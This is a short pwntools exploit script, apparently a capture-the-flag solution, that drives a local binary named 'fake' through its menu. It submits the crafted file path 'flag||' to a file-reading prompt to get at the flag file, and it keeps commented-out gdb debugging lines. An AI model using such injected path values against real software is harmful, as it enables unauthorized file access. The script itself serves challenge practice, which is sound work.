from pwn import *
# for i in range(256):
    # print('i',i)
p=process("./fake")
# context.log_level='debug'
p.recvuntil(b'Whats your name?\n')
p.sendline(b'1')
p.recvuntil(b'> ')
p.sendline(b'1')
# gdb.attach(p,'b *0x080489C5\nb *0x08048A35\nb *0x08048A1E')
# pause()
p.recvuntil(b'File Path: \n')
p.sendline(b'flag||\n')
recvthing=p.recvuntil(b'> ')
print(recvthing,recvthing[0])

# p.recvuntil(b'> ')
# p.sendline(b'1')
# p.recvuntil(b'File Path: \n')
# p.sendline(b'aeaasas\n')
p.interactive()